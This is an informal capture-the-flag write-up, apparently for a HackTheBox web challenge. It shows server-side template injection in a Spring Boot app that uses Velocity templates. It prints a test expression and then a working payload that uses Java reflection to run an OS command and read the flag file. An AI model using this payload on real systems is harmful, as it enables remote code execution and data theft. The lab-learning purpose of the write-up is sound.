this web is similar but less complicated then the Guild one.

First off, i can input text and i tested for xss. Automatically vulnerable but not really usefull

Checking at the files provided, using the zip password `hackthebox` i see that the `Main.java` uses templates. Lol this means SSTI like the past box.

I check what the Springboot app uses for the template, it uses Velocity.

Checking online for SSTI for Velocity framework, I found this one to test:
source: https://pages.dosil.es/posts/velocity/
```java
#set ($run=1 + 1) $run 
```
This one worked, output 2 in the html source.

So that means i can run java code.
After checking other article about SSTI on velocity, i found a payload to exec os command.
I edited it and got the flag:
```java
#set($e="e")
$e.getClass().forName("java.util.Scanner").getConstructor($e.getClass().forName("java.io.InputStream")).newInstance($e.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("cat /flag.txt").getInputStream()).useDelimiter("\\A").next()
```
